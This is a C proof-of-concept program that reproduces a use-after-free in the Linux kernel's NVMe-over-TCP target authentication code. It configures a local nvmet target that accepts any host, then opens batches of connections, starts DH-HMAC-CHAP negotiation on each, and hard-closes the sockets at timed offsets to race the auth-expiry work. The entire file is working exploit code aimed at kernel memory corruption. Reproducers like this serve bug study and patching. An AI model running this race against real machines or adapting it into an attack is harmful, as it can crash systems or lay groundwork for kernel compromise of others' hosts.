// gcc -O2 -static -o repro repro.c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <time.h>
#include <sys/mount.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <pthread.h>

#define NVME_TCP_ICREQ		0x0
#define NVME_TCP_ICRESP		0x1
#define NVME_TCP_CMD		0x4
#define NVME_TCP_RSP		0x5

#define NVME_FABRICS_COMMAND		0x7f
#define NVME_FABRICS_TYPE_CONNECT	0x01
#define NVME_FABRICS_TYPE_AUTH_SEND	0x05
#define NVME_FABRICS_TYPE_AUTH_RECV	0x06

#define NVME_AUTH_DHCHAP_PROTOCOL_ID	0xe9
#define NVME_AUTH_COMMON_MESSAGES	0x00
#define NVME_AUTH_DHCHAP_MSG_NEGOTIATE	0x00
#define NVME_AUTH_DHCHAP_AUTH_ID	0x01
#define NVME_AUTH_HASH_SHA256		0x01
#define NVME_AUTH_DHGROUP_2048		0x01

#define SGL_TYPE_INCAPSULE	0x01
#define NVME_CMD_SGL_METABUF	0x40

struct nvme_tcp_hdr {
	unsigned char	type;
	unsigned char	flags;
	unsigned char	hlen;
	unsigned char	pdo;
	unsigned int	plen;
} __attribute__((packed));

struct nvme_tcp_icreq_pdu {
	struct nvme_tcp_hdr	hdr;
	unsigned short		pfv;
	unsigned char		hpda;
	unsigned char		digest;
	unsigned int		maxr2t;
	unsigned char		rsvd2[112];
} __attribute__((packed));

struct nvme_sgl_desc {
	unsigned long long	addr;
	unsigned int		length;
	unsigned char		rsvd[3];
	unsigned char		type;
} __attribute__((packed));

struct nvme_cmd64 {
	unsigned char		opcode;
	unsigned char		flags;
	unsigned short		command_id;
	unsigned char		fctype;
	unsigned char		resv2[19];
	struct nvme_sgl_desc	sgl;
	unsigned char		spec[24];
} __attribute__((packed));

struct nvme_tcp_cmd_pdu {
	struct nvme_tcp_hdr	hdr;
	struct nvme_cmd64	cmd;
} __attribute__((packed));

struct nvmf_connect_data {
	unsigned char	hostid[16];
	unsigned short	cntlid;
	char		resv4[238];
	char		subsysnqn[256];
	char		hostnqn[256];
	char		resv5[256];
} __attribute__((packed));

struct dhchap_negotiate {
	unsigned char	auth_type;
	unsigned char	auth_id;
	unsigned short	rsvd;
	unsigned short	t_id;
	unsigned char	sc_c;
	unsigned char	napd;

	unsigned char	authid;
	unsigned char	rsvd2;
	unsigned char	halen;
	unsigned char	dhlen;
	unsigned char	idlist[60];
} __attribute__((packed));

#define SUBSYSNQN	"nqn.2025-01.poc:subsys1"
#define HOSTNQN		"nqn.2025-01.poc:host1"
#define TGT_PORT	4420

static int g_kato_ms = 1000;

static void die(const char *m)
{
	fprintf(stderr, "[-] %s: %s\n", m, strerror(errno));
	exit(1);
}

static int write_file(const char *path, const char *val)
{
	int fd = open(path, O_WRONLY);
	int r;

	if (fd < 0) {
		fprintf(stderr, "[-] open(%s): %s\n", path, strerror(errno));
		return -1;
	}
	r = write(fd, val, strlen(val));
	if (r < 0)
		fprintf(stderr, "[-] write(%s, %s): %s\n", path, val,
			strerror(errno));
	close(fd);
	return r < 0 ? -1 : 0;
}

static void setup_target(void)
{
	char p[512], l[512];

	mkdir("/sys/kernel/config", 0755);
	if (mount("none", "/sys/kernel/config", "configfs", 0, NULL) < 0 &&
	    errno != EBUSY)
		die("mount configfs");

	if (access("/sys/kernel/config/nvmet", F_OK) < 0)
		die("no /sys/kernel/config/nvmet (CONFIG_NVME_TARGET missing?)");

	snprintf(p, sizeof(p), "/sys/kernel/config/nvmet/subsystems/%s",
		 SUBSYSNQN);
	if (mkdir(p, 0755) < 0 && errno != EEXIST)
		die("mkdir subsystem");

	snprintf(p, sizeof(p),
		 "/sys/kernel/config/nvmet/subsystems/%s/attr_allow_any_host",
		 SUBSYSNQN);
	write_file(p, "1");

	if (mkdir("/sys/kernel/config/nvmet/ports/1", 0755) < 0 &&
	    errno != EEXIST)
		die("mkdir port");

	write_file("/sys/kernel/config/nvmet/ports/1/addr_adrfam", "ipv4");
	write_file("/sys/kernel/config/nvmet/ports/1/addr_traddr", "127.0.0.1");
	write_file("/sys/kernel/config/nvmet/ports/1/addr_trsvcid", "4420");
	write_file("/sys/kernel/config/nvmet/ports/1/addr_trtype", "tcp");

	snprintf(p, sizeof(p), "/sys/kernel/config/nvmet/subsystems/%s",
		 SUBSYSNQN);
	snprintf(l, sizeof(l),
		 "/sys/kernel/config/nvmet/ports/1/subsystems/%s", SUBSYSNQN);
	if (symlink(p, l) < 0 && errno != EEXIST)
		die("link subsystem to port");

	printf("[+] nvmet tcp target listening on 127.0.0.1:%d, subsys %s\n",
	       TGT_PORT, SUBSYSNQN);
}

static int xwrite(int fd, const void *buf, size_t n)
{
	const char *p = buf;
	while (n) {
		ssize_t r = write(fd, p, n);
		if (r <= 0)
			return -1;
		p += r;
		n -= r;
	}
	return 0;
}

static int xread(int fd, void *buf, size_t n)
{
	char *p = buf;
	while (n) {
		ssize_t r = read(fd, p, n);
		if (r <= 0)
			return -1;
		p += r;
		n -= r;
	}
	return 0;
}

static int tcp_connect(void)
{
	struct sockaddr_in sa;
	int fd, one = 1;

	fd = socket(AF_INET, SOCK_STREAM, 0);
	if (fd < 0)
		return -1;
	memset(&sa, 0, sizeof(sa));
	sa.sin_family = AF_INET;
	sa.sin_port = htons(TGT_PORT);
	sa.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
	if (connect(fd, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
		close(fd);
		return -1;
	}
	setsockopt(fd, IPPROTO_TCP, TCP_NODELAY, &one, sizeof(one));
	return fd;
}

static int do_icreq(int fd)
{
	struct nvme_tcp_icreq_pdu req;
	unsigned char resp[128];

	memset(&req, 0, sizeof(req));
	req.hdr.type = NVME_TCP_ICREQ;
	req.hdr.hlen = sizeof(req);
	req.hdr.pdo = 0;
	req.hdr.plen = sizeof(req);

	if (xwrite(fd, &req, sizeof(req)))
		return -1;
	if (xread(fd, resp, sizeof(resp)))
		return -1;
	if (resp[0] != NVME_TCP_ICRESP) {
		fprintf(stderr, "[-] bad icresp type %d\n", resp[0]);
		return -1;
	}
	return 0;
}

static int read_rsp(int fd, unsigned int *result)
{
	unsigned char pdu[24];
	unsigned short status;

	if (xread(fd, pdu, sizeof(pdu)))
		return -1;
	if (pdu[0] != NVME_TCP_RSP) {
		fprintf(stderr, "[-] unexpected pdu type 0x%x\n", pdu[0]);
		return -1;
	}

	if (result)
		memcpy(result, pdu + 8, 4);
	memcpy(&status, pdu + 8 + 14, 2);
	return (status >> 1) & 0x7ff;
}

static int do_connect_cmd(int fd, int kato_ms)
{
	struct nvme_tcp_cmd_pdu pdu;
	struct nvmf_connect_data d;
	unsigned char buf[sizeof(struct nvme_tcp_cmd_pdu) +
			  sizeof(struct nvmf_connect_data)];
	unsigned short recfmt = 0, qid = 0, sqsize = 1;
	unsigned int kato = kato_ms;
	int st;

	memset(&pdu, 0, sizeof(pdu));
	pdu.hdr.type = NVME_TCP_CMD;
	pdu.hdr.flags = 0;
	pdu.hdr.hlen = sizeof(pdu);
	pdu.hdr.pdo = sizeof(pdu);
	pdu.hdr.plen = sizeof(pdu) + sizeof(d);

	pdu.cmd.opcode = NVME_FABRICS_COMMAND;
	pdu.cmd.flags = NVME_CMD_SGL_METABUF;
	pdu.cmd.command_id = 0x0001;
	pdu.cmd.fctype = NVME_FABRICS_TYPE_CONNECT;
	pdu.cmd.sgl.addr = 0;
	pdu.cmd.sgl.length = sizeof(d);
	pdu.cmd.sgl.type = SGL_TYPE_INCAPSULE;

	memcpy(pdu.cmd.spec + 0, &recfmt, 2);
	memcpy(pdu.cmd.spec + 2, &qid, 2);
	memcpy(pdu.cmd.spec + 4, &sqsize, 2);
	memcpy(pdu.cmd.spec + 8, &kato, 4);

	memset(&d, 0, sizeof(d));
	memset(d.hostid, 0x42, sizeof(d.hostid));
	d.cntlid = 0xffff;
	strncpy(d.subsysnqn, SUBSYSNQN, sizeof(d.subsysnqn) - 1);
	strncpy(d.hostnqn, HOSTNQN, sizeof(d.hostnqn) - 1);

	memcpy(buf, &pdu, sizeof(pdu));
	memcpy(buf + sizeof(pdu), &d, sizeof(d));

	if (xwrite(fd, buf, sizeof(buf)))
		return -1;

	st = read_rsp(fd, NULL);
	if (st != 0) {
		fprintf(stderr, "[-] connect failed, status 0x%x\n", st);
		return -1;
	}
	return 0;
}

static int do_auth_send_negotiate(int fd)
{
	struct nvme_tcp_cmd_pdu pdu;
	struct dhchap_negotiate n;
	unsigned char buf[sizeof(struct nvme_tcp_cmd_pdu) +
			  sizeof(struct dhchap_negotiate)];
	unsigned int tl = sizeof(n);

	memset(&pdu, 0, sizeof(pdu));
	pdu.hdr.type = NVME_TCP_CMD;
	pdu.hdr.hlen = sizeof(pdu);
	pdu.hdr.pdo = sizeof(pdu);
	pdu.hdr.plen = sizeof(pdu) + sizeof(n);

	pdu.cmd.opcode = NVME_FABRICS_COMMAND;
	pdu.cmd.flags = NVME_CMD_SGL_METABUF;
	pdu.cmd.command_id = 0x0002;
	pdu.cmd.fctype = NVME_FABRICS_TYPE_AUTH_SEND;
	pdu.cmd.sgl.addr = 0;
	pdu.cmd.sgl.length = tl;
	pdu.cmd.sgl.type = SGL_TYPE_INCAPSULE;

	pdu.cmd.spec[1] = 0x01;
	pdu.cmd.spec[2] = 0x01;
	pdu.cmd.spec[3] = NVME_AUTH_DHCHAP_PROTOCOL_ID;
	memcpy(pdu.cmd.spec + 4, &tl, 4);

	memset(&n, 0, sizeof(n));
	n.auth_type = NVME_AUTH_COMMON_MESSAGES;
	n.auth_id = NVME_AUTH_DHCHAP_MSG_NEGOTIATE;
	n.t_id = 0x1234;
	n.sc_c = 0;
	n.napd = 1;
	n.authid = NVME_AUTH_DHCHAP_AUTH_ID;
	n.halen = 1;
	n.dhlen = 1;
	n.idlist[0] = NVME_AUTH_HASH_SHA256;
	n.idlist[30] = NVME_AUTH_DHGROUP_2048;

	memcpy(buf, &pdu, sizeof(pdu));
	memcpy(buf + sizeof(pdu), &n, sizeof(n));

	if (xwrite(fd, buf, sizeof(buf)))
		return -1;

	return read_rsp(fd, NULL);
}

static void hard_close(int fd)
{
	struct linger lg = { 1, 0 };

	setsockopt(fd, SOL_SOCKET, SO_LINGER, &lg, sizeof(lg));
	close(fd);
}

static long long now_us(void)
{
	struct timespec ts;
	clock_gettime(CLOCK_MONOTONIC, &ts);
	return (long long)ts.tv_sec * 1000000 + ts.tv_nsec / 1000;
}

static int one_round(long delay_us_after_expiry)
{
	int fd, st;
	long long t0, target;

	fd = tcp_connect();
	if (fd < 0)
		return -1;
	if (do_icreq(fd)) {
		close(fd);
		return -1;
	}
	if (do_connect_cmd(fd, g_kato_ms)) {
		close(fd);
		return -1;
	}
	st = do_auth_send_negotiate(fd);
	if (st < 0) {
		close(fd);
		return -1;
	}
	t0 = now_us();

	target = t0 + (long long)((g_kato_ms + 999) / 1000) * 1000000 +
		 delay_us_after_expiry;

	while (now_us() < target - 2000)
		usleep(200);
	while (now_us() < target)
		;

	hard_close(fd);
	return st;
}

#define NCONN	192

static int fds[NCONN];
static long long tauth[NCONN];
static int g_nconn = NCONN;

static int one_batch(long off_us)
{
	int i, n = 0;
	long long expire;

	for (i = 0; i < g_nconn; i++) {
		fds[i] = -1;
		tauth[i] = 0;
	}

	for (i = 0; i < g_nconn; i++) {
		int fd = tcp_connect();

		if (fd < 0)
			break;
		if (do_icreq(fd) || do_connect_cmd(fd, g_kato_ms) ||
		    do_auth_send_negotiate(fd) < 0) {
			close(fd);
			continue;
		}
		fds[n] = fd;
		tauth[n] = now_us();
		n++;
	}
	if (!n)
		return -1;

	for (i = 0; i < n; i++) {
		expire = tauth[i] +
			 (long long)((g_kato_ms + 999) / 1000) * 1000000 +
			 off_us;
		while (now_us() < expire - 2000)
			usleep(200);
		while (now_us() < expire)
			;
		hard_close(fds[i]);
	}
	return n;
}

int main(int argc, char **argv)
{
	int iters = 60;
	int i, n;
	long off;

	setvbuf(stdout, NULL, _IONBF, 0);
	printf("[*] nvmet auth_expired_work UAF PoC\n");

	setup_target();

	if (argc > 1)
		iters = atoi(argv[1]);
	if (argc > 2 && atoi(argv[2]) > 0 && atoi(argv[2]) <= NCONN)
		g_nconn = atoi(argv[2]);

	printf("[*] probe round\n");
	i = one_round(0);
	printf("[*] auth_send status = %d (0 == accepted, work armed)\n", i);

	for (i = 0; i < iters; i++) {
		off = (long)((i % 21) * 20) - 200;
		n = one_batch(off);
		printf("[*] batch %d: %d queues, off %+ldus\n", i, n, off);
	}

	printf("[*] done, sleeping to let any pending work run\n");
	sleep(5);
	return 0;
}
